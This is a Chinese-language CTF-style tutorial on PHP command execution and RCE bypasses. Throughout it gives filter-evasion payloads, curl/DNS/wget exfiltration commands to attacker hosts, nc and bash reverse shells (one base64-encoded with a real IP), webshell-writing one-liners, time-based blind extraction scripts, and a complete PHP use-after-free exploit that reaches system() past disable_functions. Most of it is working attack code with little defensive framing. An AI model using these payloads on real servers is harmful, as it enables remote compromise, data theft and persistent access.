## PHP中的命令执行函数

> 创建: 未知 | 更新: 2026-05-21 | 适用: PHP通用 (system/passthru/exec/shell_exec) | ⚠️ 部分图片托管于外部CDN

### system

`system` — 执行外部程序，并且显示输出

| 参数    | 说明         |
| ------- | ------------ |
| command | 要执行的命令 |

**返回值:** 成功则返回命令输出的最后一行，失败则返回 `false`。

[![alt text](https://image.3001.net/images/20240316/1710591779_65f58f23716cb03e124e8.png)](https://image.3001.net/images/20240316/1710591779_65f58f23716cb03e124e8.png)

### passthru

`passthru` — 执行外部程序并且显示原始输出

| 参数    | 说明         |
| ------- | ------------ |
| command | 要执行的命令 |

**返回值:** 成功时返回 `null`， 或者在失败时返回 `false`。

[![alt text](https://image.3001.net/images/20240316/1710591782_65f58f2666a6c12da4d88.png)](https://image.3001.net/images/20240316/1710591782_65f58f2666a6c12da4d88.png)

### exec

`exec` — 执行一个外部程序，并返回执行结果的最后一行内容。

| 参数    | 说明                                           |
| ------- | ---------------------------------------------- |
| command | 要执行的命令                                   |
| output  | 如果设置该参数则使用命令执行的结果填充该数组。 |

**返回值:** 命令执行结果的最后一行内容，失败时返回 `false`。

[![alt text](https://image.3001.net/images/20240316/1710591784_65f58f28708197f0aafb1.png)](https://image.3001.net/images/20240316/1710591784_65f58f28708197f0aafb1.png)

### shell_exec

`shell_exec` — 通过 shell 执行命令并将完整的输出以字符串的方式返回。

| 参数    | 说明         |
| ------- | ------------ |
| command | 要执行的命令 |

**返回值:** 返回已执行命令的输出类型为`string`，如果无法建立管道，则为 `false`，如果发生错误或者命令不产生输出则为 `null`。

[![alt text](https://image.3001.net/images/20240316/1710591786_65f58f2adf0a31e20b80e.png)](https://image.3001.net/images/20240316/1710591786_65f58f2adf0a31e20b80e.png)

该函数同`执行运算符`，也就是一对反引号。

[![alt text](https://image.3001.net/images/20240316/1710591788_65f58f2c8a6ce5e461cc1.png)](https://image.3001.net/images/20240316/1710591788_65f58f2c8a6ce5e461cc1.png)

如果禁用了 `shell_exec` 函数的执行，那么反引号执行时无效的。

### popen

`popen` - 打开进程文件指针，默认只会执行程序，并不会打印程序的执行结果。

| 参数    | 说明                               |
| ------- | ---------------------------------- |
| command | 要执行的命令                       |
| mode    | 模式。`r` 表示阅读，`w` 表示写入。 |

**返回值:** 返回打开文件的指针。

[![alt text](https://image.3001.net/images/20240316/1710591793_65f58f31a784eff8fa6d1.png)](https://image.3001.net/images/20240316/1710591793_65f58f31a784eff8fa6d1.png)

如果想要获取命令执行的结果，则需要使用 `fread()` 读取文件指针。

## 命令拼接符

### Windows 和 Linux

```
bash
command1 | command2 # 管道符前面和后面的命令都会执行，只不过只会返回后者的命令执行结果。如果1执行错误,则2不再执行
command1 || command2 # 如果1执行出错，则会执行2
command1 & command2 # 先执行1，不管成功与否都会执行2
command1 && command2 # 先执行1，如果执行出错则不再执行2，如果1执行成功则会执行2
```

### Linux 独有的

```
bash
command1;command2  # 先执行1再执行2，不管1成功与否都会执行2
```

## Bypass 过滤

### 空格的过滤

```
bash
$IFS  # 不推荐
${IFS} 
$IFS$9 
<
<>
{cat,flag.php}
%09 # 制表符Tab键
```

### 关键字过滤

假设题目过滤 `flag.php` 关键字

```
bash

cat fl\ag.php # 反斜线转义
cat fl''ag.php # 单引号分割
cat fl""ag.php # 双引号分割
echo Y2F0IGZsYWcucGhw |base64 -d |bash # base64编码
echo 63617420666c61672e706870 | xxd -r -p | bash # hex 编码
cat f[l]ag.php # 通配符
cat f[k-m]ag.php  # 通配符
cat f?ag.php   # 通配符
cat fla*.php # 通配符
cat f{k..m}ag.php # 通配符
a=fl;cat ${a}ag.php # 变量做拼接
a=fl;b=ag;cat $a$b.php # 变量做拼接
cat `echo -n 666c61672e706870|xxd -r -p` # 内敛执行
echo -n 666c61672e706870|xxd -r -p | xargs cat # 内敛执行
```

### cat命令过滤

可以尝试上面关键字过滤的方法，也可以使用如下命令做等价替换:

```
bash
cat	    # 从第一行开始显示全部的文本内容
tac	    # 从最后一行开始，显示全部分文本内容，与 cat 相反
nl	    # 显示文本时，输出行号
more	    # 按页显示文件内容
less	    # 如 more 命令差不多，也是按页显示内容
head	    # 从头开始显示文件指定的行数，默认只显示前 10 行
tail	    # 显示文件指定的结尾行数
sort	    # 对文件内容进行排序
```

### escapeshe[arg/cmd]

关于这俩函数的 bypass 请见文章: https://paper.seebug.org/164/

#### escapeshellcmd

`escapeshellcmd` — shell 元字符转义

| 参数    | 说明         |
| ------- | ------------ |
| command | 要转义的命令 |

```
php
<?php
// 我们故意允许任意数量的参数
$command = './configure '.$_POST['configure_options'];
$escaped_command = escapeshellcmd($command);w
system($escaped_command);
?>
```

而 `escapeshellcmd` 作用有:

1. 确保用户只执行了一个命令
2. 用户可以指定不限量的参数
3. 用户不能执行不同的命令

#### escapeshellarg

`escapeshellarg` — 把字符串转义为可以在 shell 命令里使用的参数

| 参数 | 说明         |
| ---- | ------------ |
| args | 要转义的参数 |

```
php
<?php
system('ls '.escapeshellarg($_GET['dir']));
?>
```

而 `escapeshellarg` 作用有:

1. 确保用户只传递一个参数给命令
2. 用户不能指定更多的参数，只能是一个参数
3. 用户不能执行不同的命令

## 无回显 RCE

### 请求带出

#### HTTP 请求带出

```
plaintext
curl your_ip:your_port/?query=`cat /flag`
```

[![alt text](https://image.3001.net/images/20240316/1710591802_65f58f3acc278a0925a33.png)](https://image.3001.net/images/20240316/1710591802_65f58f3acc278a0925a33.png)

可以从结果中看到，这里我们的文件内容是 `flag{...}` 但是该符号由于是特殊字符，自动删除了，于是我们可以使用base64的形式进行编码之后传输。

[![alt text](https://image.3001.net/images/20240316/1710591805_65f58f3d950a0b814259a.png)](https://image.3001.net/images/20240316/1710591805_65f58f3d950a0b814259a.png)

#### DNSlog请求带出

```
bash
ping `whoami`.yourname.cn  
```

[![alt text](https://image.3001.net/images/20240316/1710591811_65f58f43382c619a4255f.png)](https://image.3001.net/images/20240316/1710591811_65f58f43382c619a4255f.png)

但是由于是通过域名解析获取的文件内容，所以文件内容不能有特殊字符。也不能进行base64编码，因为base64编码里面可能有 `=`。

所以只能选择十六进制编码:

```
plaintext
ping  `xxd -p /flag`.yourname.cn 
```

[![alt text](https://image.3001.net/images/20240316/1710591813_65f58f458ac02c2f774e8.png)](https://image.3001.net/images/20240316/1710591813_65f58f458ac02c2f774e8.png)

但是由于域名的长度限制，故而只能带出最后几位字符，于是如果能使用 复制、剪切、反弹shell等功能尽量不要选择 `DNSlog`外带。

#### wget 请求带出

wget 的 `--post-file` 参数允许从一个文件中读取内容作为 POST 请求体的内容。

```
bash
wget --post-file ./flag 120.48.128.24:2333
```

[![**alt text**](https://image.3001.net/images/20240316/1710591821_65f58f4d4c64f767ed576.png)](https://image.3001.net/images/20240316/1710591821_65f58f4d4c64f767ed576.png)

### 请求带出平台

| 平台地址              | 说明                                                  |
| --------------------- | ----------------------------------------------------- |
| http://www.dnslog.cn/ | 只能使用 dnslog 外带，另外很多防火墙会 ban 掉该域名。 |
| http://ceye.io/       | 可以使用 `http` 外带和 `dnslog` 外带，推荐。          |

### bash 时间盲注

#### 截取

在 `shell` 中字符串截取可以使用 `cut -c number` 其中的 `-c` 参数指定的 `number` 表示截取第几个字符。

[![alt text](https://image.3001.net/images/20240316/1710591824_65f58f5067d0650d7a0d8.png)](https://image.3001.net/images/20240316/1710591824_65f58f5067d0650d7a0d8.png)

#### 比较

使用 `shell` 中的 if 判断语句即可。其语法结构如下:

```
bash
if condition
then
    command1 
    command2
    ...
    commandN 
fi
```

例如判断 `/flag` 文件的第一个内容是不是 `f`，如果是就延时`5` 秒，否则什么都不做。

```
bash
if [ `cut -c 1 /flag` = 'f' ];then sleep 5;fi
```

#### 脚本编写

```
python

import requests

chars = [' ', '!', '"', '#', '$', '%', '&', "'", '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';', '<', '=', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~']
result = ""
url = "http://120.48.128.24:9090/"
for i in range(1,100):
    for char in chars:
        payload = f"?cmd=if [ `cut -c {i} /flag` = '{char}' ];then sleep 5;fi"
        try:
            req = requests.get(url + payload, timeout=5)
        except:
            result += char
            print(result)
            break
    if (char == '~'):
        break
```

执行结果:

[![alt text](https://image.3001.net/images/20240316/1710591830_65f58f56cf15ee92caecd.png)](https://image.3001.net/images/20240316/1710591830_65f58f56cf15ee92caecd.png)

## 系统命令简介

系统命令，简单解释就是在系统终端可执行的预定义命令，就是大家常见的黑框框。在linux操作系统中，预定义命令默认存储位置为/bin目录，而windows操作系统的预定义命令默认存储位置为C:\Windows\System32，下面将针对linux和win的系统命令做简单介绍。

### 管道符

在win和linux这两种操作系统中，我们可以利用管道符来同时执行多条命令

```php
windows：
‘|’ 直接执行后面的语句
‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句
‘&’ 前面和后面命令都要执行，无论前面真假
&&如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令

linux：
Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&’ 作用相同
```

### 通配符

在linux操作系统中支持如下两种通配符

```php
?   可代替任意一个字符
*   可代替0-任意个字符
```

**例**

```php
若当前目录只存在一个名为flag的文件
cat flag <==> cat fla?  <==>  cat f*
```

### 重定向

在linux操作系统中一共有>和>>两个重定向符号

**1.>符号**

用于将命令的标准输出重定向到指定的文件，如果文件不存在，则会创建文件；如果文件已经存在，则会覆盖文件内容。

```php
ls > file.txt    //将ls的执行结果写入file.txt中
>file.txt        //创建名为file.txt的文件
```

**2.>>符号**

将命令的标准输出重定向到指定的文件，但与`>` 不同的是，如果文件已经存在，`>>` 会将输出追加到文件末尾而不是覆盖文件内容。

```php
ls >> file.txt
```

### 常见系统命令

在高级语言当中，系统命令通常需要特定的函数才能执行。例如php中的

| system()     |
| :----------- |
| passthru()   |
| exec()       |
| shell_exec() |
| popen()      |
| proc_open()  |
| pcntl_exec() |
| ``           |

python中的例如等

根据函数不同，其所需参数以及回显情况等都会略有不同，需要根据实际情况进行调整

#### windows

| 命令     | 实际效果                                   |
| :------- | :----------------------------------------- |
| ipconfig | 主要用来查看当前机器内、外网ip             |
| type     | type filename 查看文件内容                 |
| cd       | 目录跳转                                   |
| ping     | ping ip或者url 主要用来判断某机器是否可达  |
| dir      | 列出当前目录                               |
| whoami   | 查看当前用户，主要用于判断是否可以命令执行 |

#### linux

**基础命令**

| 命令     | 实际效果                   |
| :------- | :------------------------- |
| ls       | 列出当前目录               |
| cd       | 目录跳转                   |
| rm       | 删除                       |
| mv       | 重命名                     |
| whoami   | 查看当前用户               |
| uname -a | 列出内核版本等详细系统讯息 |
| ifconfig | 查看当前机器内外网ip       |
| ping     | 判断目标机器是否可达       |
| touch    | 创建文件                   |
| mkdir    | 创建目录                   |

在ctf比赛当中，最常见的就是文件读取命令的绕过，下面是一些常见的**文件读取命令**

| 命令           | 实际效果                               |
| :------------- | :------------------------------------- |
| cat            | 文件读取                               |
| tac            | 文件读取（行倒序输出）                 |
| more           | 文件读取（一页一页显示）               |
| less           | 文件读取（一页一页显示，可翻页）       |
| head           | 文件读取（显示头几行）                 |
| tail           | 文件读取（显示最后几行）               |
| nl             | 文件读取（会输出行号）                 |
| vim/vi         | 文本编辑器，可用于内容查看             |
| nano           | 文本编辑器，可用于内容查看             |
| emacs          | 文本编辑器，可用于内容查看             |
| sed -n '1,10p' | 文件读取（显示前10行）                 |
| rev            | 文件读取（倒序输出）                   |
| base64         | 文件读取（以base64形式输出）           |
| strings        | 文件读取（提取文件中可输出的字符串）   |
| xxd            | 文件读取（二进制形式输出）             |
| hexdump        | 文件读取（16进制形式输出）             |
| od             | 文件读取（8进制形式输出）              |
| uniq           | 文件读取（会去掉重复行）               |
| cp             | 文件复制（可用于突破目标文件权限限制） |

#### 其它命令

除了以上的常见命令外还有其它的一些常用命令

##### **find**

常用于在linux系统中查找某文件（支持通配符）的具体位置

```php
find / -name flag
find / -name f*
find / -name fla?
/为查找的起始根目录，以上命令会以/（根目录）为查找根目录，在其以及其子目录中查找符合后续命名规则的文件
```

##### **sed**

在某些情况需要对文件内容进行适当修改，但题目环境并未提供vi等文本编辑器，此时可以利用sed达到精准替换某行的目的

```php
实现格式为：
sed -i '行数s/原内容/替换为的内容/' 文件名

sed -i '2s/x\.x\.x\.x/150.158.24.228/' filename
sed -i '3s/7002/7000/' filename
sed -i '4s/.*//' filename
```

PS：

```php
1.该命令支持通配符
2.该命令对于特殊符号需要用\进行转义，如上述的例1中的.
```

##### **echo**

如果需要大规模写入内容，可以使用base64编码防止数据丢失，再结合echo将内容写入指定文件

```php
实现格式为：
echo 'base64编码的数据' | base64 -d > filename
```

## 二、命令执行

### system类命令执行

所谓system类命令执行即是原题目已经给出system函数，且其参数是可控的这种情况，下面将以php为例着重讲解该情况下的命令执行方式以及绕过姿势

**示例代码**

```php
<?php
system($_POST['1']);
?>
```

#### 无回显rce

在1.3节开篇我们提到了很多可执行系统命令的函数，他们都可以达成执行系统命令的目的，但其中的一些函数会不会将执行的结果回显，例如exec函数，此时我们就需要通过某些手法得到回显，下面将对这些手法进行详细讲解

##### 反弹shell

###### **vps简介**

作为一名合格的web手，一台vps是必不可少的，所谓vps就是一台具有公网ip的服务器，可从下面三方厂家获取

1.华为云：https://www.huaweicloud.com/（云耀云服务器）

2.腾讯云：https://cloud.tencent.com/（轻量型服务器）

3.阿里云：https://www.aliyun.com/

服务器和我们个人PC电脑最大的区别就是具有公网ip，实际效果就是任意用户皆可达我们的服务器（可ping通），而个人PC电脑绝大多数情况是无法实现该功能的。详细购买流程以及产品讯息可与对应客服探讨，成功购买后即可使用ssh（服务器自带的远程连接工具）或电脑自带的远程桌面功能进行服务器登录

**1.ssh登录**

ssh软件推荐termius

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-b30bd3bf366485ea1ed89184af638b1a59c7c23c.png)

从厂家获取账号密码以及公网ip后将其填入1，2，3处，然后点击4处即可远程连接到服务器

**2.电脑自带远程桌面功能登录**（常用于win系统）

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-913cbd7095188438d6955f0f57a6dac2d127a514.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-a3d74d7d30c3ab0796f989f2d05dc6887fdfae16.png)

在此界面输入公网ip，稍后再输入厂家给予的账号密码即可登录成功

###### 反弹手法

**1.nc反弹**

```php
正向连接：
linux靶机:nc -e /bin/bash -lvvnp 端口
win靶机:nc -e cmd -lvvnp 端口     //win系统不自带nc，需要手动上传，此处nc并非固定，根据实际上传的程序名做相应修改
攻击机:nc 靶机ip 端口

反向连接：
linux靶机:nc -e /bin/bash 攻击机ip 端口
win靶机:nc -e cmd 攻击机ip 端口
攻击机:nc -lvvnp 端口

//上述所有操作皆是带有-lvvnp的操作（端口监听）优先
```

**2.bash反弹**

```php
攻击机:nc -lvvnp 端口
靶机:bash -c "bash -i >& /dev/tcp/攻击机ip/攻击机监听的端口 0>&1"
数组版靶机（java源码）:bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYx}|{base64,-d}|{bash,-i}
//使用时需要对命令中的编码部分解码，将其中的ip和端口修改为攻击机ip段端口后并重新编码才可使用，浏览器传参时需要url编码
```

示例演示

1.在靶机**可达的机器（可ping通，如公网服务器或同网段机器）**上监听端口

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-f5c166b1c5fcde0b4a80e183954f1fa9b49670a0.png)

2.在靶机上执行bash反弹命令

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-b7374741b7745e6c0f9027274866ea76659fc0d6.png)

3.查看刚刚监听端口的服务器

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-eeb7d3445b9a12d91c596fdd6a5fa4d8ed858ded.png)

可以发现反弹shell成功，此时可执行任意系统命令

**3.写shell文件后执行**

```php
创建shell.sh
bash -c "bash -i >& /dev/tcp/服务器ip/端口 0>&1"
将上述bash反弹命令写入文件，详见1.2.3节中的echo用法
./shell.sh
利用.执行shell.sh反弹shell
```

**正向连接与反向连接简介**

借用迪总一张图

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-deefca5a9b97d23b03926b8308b2d7e44545fb33.png)

PC1、PC2、PC3为我们的目标机器，此时不难发现三台靶机都处于内网环境

正向连接：攻击机主动连接靶机

反向连接：靶机主动连接攻击机

准则：谁被动，谁监听

在上述环境中，有且仅有**可访问路由**、**linux外网服务器**、**windows服务器**这三个ip是可访问的，而我们的三台PC靶机此时处于内网环境，相当于我们的个人PC电脑，此时是无法访问的，我们的外网服务器最多只可致**可访问路由**处，即攻击机无法主动连接到靶机，所以此时就无法正向连接。由于我们外网服务器皆为**公网服务器**，所以三台PC靶机是可以访问到服务器的，即可以进行反向连接，让靶机主动连接攻击机，也就是我上面演示的bash反弹的操作。

##### 数据写出

将命令的执行结果写入其他文件，再访问其他文件获取执行结果，下以1.txt为例

```php
利用cp命令：cp flag.php 1.txt

利用mv命令：mv flag.php 1.txt

利用>输出结果到文件：ls > 1.txt

利用tee命令：ls | tee 1.txt    //tee会从从标准输入读取数据，并将其写入文件以及标准输出

利用script命令：ls | script 1.txt  //会开启命令记录，命令执行状态以及结果都将会写入文件中
```

##### 数据外带

在题目环境出网的条件下，我们可以通过数据外带将命令执行的结果外带出来，此处推荐两个外带网址：

1.[http://dnslog.cn](http://dnslog.cn/)

2.http://ceye.io/（推荐，更稳定）

linux的数据外带归功于其反引号可执行任意系统命令这一特殊机制

```php
单行传输：
ping `whoami`.dns地址
curl http://dns地址/`whoami`

//whoami即为我们要执行的系统命令，将其用``包裹后利用.将其与我们的dns地址进行拼接，执行命令后即可在dns处得到whoami命令的回显

多行传输：(外带只会显示第一行的数据)
curl http://y91yp4.ceye.io/`ls / | base64`           //将结果进行base64编码后外带出来
curl http://y91yp4.ceye.io/`whoami | sed -n '2p'`    //输出固定行的结果
curl -T /flag http://y91yp4.ceye.io/                 //指定文件外带
```

下面我会就这两个外带平台进行演示

**1.dnslog**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-1c1744dbdc1f7d32b00c98b5daafcf2987a48f84.png)

首先点击get subdomain，即可获得2所示的url地址，随后即可在靶机执行如下命令

```php
ping `whoami`.dns地址
ping `whoami`.b854kz.dnslog.cn
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-773a7deb6e6008da1606764e3df503fa0d379375.png)

点几下refresh record（点成get就得重新搞了）即可获得回显，可以得到靶机当前用户为root

**2.ceye**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-ff9e293f2493756c82a4dbf94b3f5c482f37d2f0.png)

login处登录后应为profile，在profile出得到url地址后即可执行如下命令

```php
curl http://y91yp4.ceye.io/`ls / | base64` 
```

点几下reload即可得到回显结果

##### 盲注

```python
import requests
import string
import time

url='http://localhost.test.php/?c='
dic=string.printable[:-6]
flag=''

for i in range(1,50):
    judge=0
    for j in dic:
        now=f'{url}a=$(cat /flag | head -1 | cut -b {i});if [ $a = {j} ];then sleep 2;fi'
        start=time.time()
        r=requests.get(now)
        end=time.time()
        if int(end)-int(start) >1:
            judge=1
            flag+=j
            print(flag)
            break
    if judge==0:
        break

print(flag)
```

**核心命令分析**

```php
a=$(cat /flag | head -1 | cut -b {i});if [ $a = {j} ];then sleep 2;fi
```

**第一部分**

```php
a=$(cat /flag | head -1 | cut -b {i});
定义变量a，将cat /flag的结果利用head -1取第一行，利用cut -b number取结果的第i（脚本中的循环i）个字符，将字符赋值给a
```

**第二部分**

```php
if [ $a = {j} ];
判断得到的变量a是否等于j，j为上述脚本中dic字典的遍历结果
```

**第三部分**

```php
then sleep 2;fi
如果判断为真，则睡眠2秒，通过网页是否睡眠判断出flag的每个字母的结果
```

##### 命令行写shell

可以通过命令执行写入shell，然后蚁剑连接，在某些情况会是一个不错的选择

```php
echo 'PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=' | base64 -d > ./123.php  

//base64解码结果为<?php eval($_POST[1]);?>

echo '<?php eval(\$_GET[1]);phpinfo();?>' > /var/www/html/2.php
```

#### 长度限制绕过

示例代码

```php
<?php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("111");
    }
} 
```

此题利用substr函数对eval的代码进行了限制

```php
get传参   F=`$F `; sleep 3
经过substr($F,0,6)截取后 得到  `$F `;
也就是会执行 eval("`$F `;");
我们把原来的$F带进去
eval("``$F `;sleep 3`");
也就是说最终会执行  ` `$F `;sleep 3 ` == shell_exec("`$F `; sleep 3");
前面的命令我们不需要管，但是后面的命令我们可以自由控制。
这样就在服务器上成功执行了 sleep 3
所以 最后就是一道无回显的RCE题目了，将sleep 3换成我们2.1.1节中所讲的操作即可得到答案
```

#### 命令绕过

##### 空格

```php
$IFS              

{cat,flag.php}                        --这里把，替换成了空格键

%20                                   --代表space键

\x20                                  --代表space键，eval类中可用

%09                                   --需要php环境，如cat%09flag.php

\x09                                  --代表space键，eval类中可用

${IFS}                                --单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS}flag.php

$IFS$9                                --后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php

<                                     --重定向，如cat<flag.php

<>                                    --重定向，如cat<>flag.php
```

##### 字符串拼接绕过

```php
a=l;b=s;c=/;$a$b $c
```

定义变量a为l，b为s，c为/，执行命令$a$b $c即ls /

##### base64编码绕过

```php
echo MTIzCg==|base64 -d 其将会打印123

echo bHMgLw== | base64 -d | bash 
`echo bHMgLw== | base64 -d`                   ==>三种结果皆为ls /
echo bHMgLw== | base64 -d | sh
```

##### 16进制编码绕过

生成脚本

```php
<?php
$a = 'ls /';
echo bin2hex($a);  //6c73202f
?>
```

payload

```php
echo 6c73202f | xxd -r -p | bash
`echo 6c73 | xxd -r -p`
echo `6c73202f` | xxd -r -p | sh > 1.txt
```

##### 单双引号绕过

```php
ca''t flag 
ca""t flag
l''s /
l""s /
```

##### 反斜杠绕过

```php
l\s /
l\s /var/www/ht\ml
ca\t f\ag
```

##### 绕过ip中的句点

```php
网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。
可以直接访问http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。
```

[数字转ip地址](http://www.msxindl.com/tools/ip/ip_num.asp)

[ip地址转数字](http://www.msxindl.com/tools/ip/ip_num.asp)

[域名转数字ip](http://www.msxindl.com/tools/ip/ip_num.asp)

##### 正则匹配绕过

```php
cat flag  =>   cat [e-g]lag
               cat f{k..m}ag
```

两种正则匹配稍有不同：

1.[]为开区间，并**不包含**左右边界

2.{}为闭区间，**包含**左右边界

所以可得，前者只会匹配f，而后者会匹配k,l,m

##### 内敛执行法绕过

```php
cat `ls`
//获取ls下的所有的文件内容
```

##### 黑洞绕过

**黑洞：**

```php
>/dev/null 2>&1
>代表重定向，会将我们命令执行的所有结果全部丢进预定义的/dev/null这一垃圾桶中，导致我们收不到回显
```

利用管道符绕过,效果详见1.1节

```php
ls || >/dev/null 2>&1
```

##### 绕过open_basedir()

**1.ini_set重设置绕过**

```php
<?php
// 设置 open_basedir
ini_set('open_basedir', '/path/to/allowed/directory:/another/allowed/directory');
?>
```

可以设置多个安全目录，目录和目录之间可以使用:进行分隔

**2.UAF脚本绕过安全目录**

使用时需要进行url编码再传入（bp编码）

```php
<?php
function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);

                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);

                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag02.txt");ob_end_flush();
?>
```

##### 绕过disable_function

**适用于eval类命令执行**

```php
$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}

$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}

$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}

#扫描根目录有什么文件
$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->getFilename()." ");} 
$a=opendir('/');while(($file = readdir($a)) !=false){echo $file." ";}    
c=var_dump(scandir('/'));
$a=opendir('/');while(($file=readdir($a)) != false) {echo $file."";}

#读取的话一般都是用的include(),highlight_file(),show_source(),readfile(),require(),require_once()等函数进行读取
```

